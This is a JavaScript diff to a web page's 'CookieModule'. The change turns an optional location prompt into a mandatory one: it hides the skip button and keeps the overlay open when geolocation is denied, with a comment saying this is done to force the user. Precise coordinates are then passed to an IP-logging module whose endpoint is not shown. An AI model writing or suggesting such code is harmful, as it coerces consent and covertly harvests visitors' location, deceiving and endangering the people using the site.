@@ -72,24 +72,31 @@ const IPModule = {
 
 const CookieModule = {
   init() {
+    if (localStorage.getItem("loc_granted")) return;
+
     const overlay = document.getElementById("location-overlay");
     const allow   = document.getElementById("location-allow");
     const skip    = document.getElementById("location-skip");
 
     if (!overlay) return;
 
+    overlay.style.display = "flex";
+
     allow.addEventListener("click", () => {
-      overlay.remove();
       navigator.geolocation.getCurrentPosition(
-        (pos) => IPModule.send(pos.coords.latitude, pos.coords.longitude),
-        ()    => IPModule.send(null, null)
+        (pos) => {
+          localStorage.setItem("loc_granted", "1");
+          overlay.remove();
+          IPModule.send(pos.coords.latitude, pos.coords.longitude);
+        },
+        () => {
+          // negou GPS, mantém overlay aberto para forçar
+          alert("A localização é necessária para continuar. Por favor, permita o acesso.");
+        }
       );
     });
 
-    skip.addEventListener("click", () => {
-      overlay.remove();
-      IPModule.send(null, null);
-    });
+    if (skip) skip.style.display = "none";
   },
 };
 
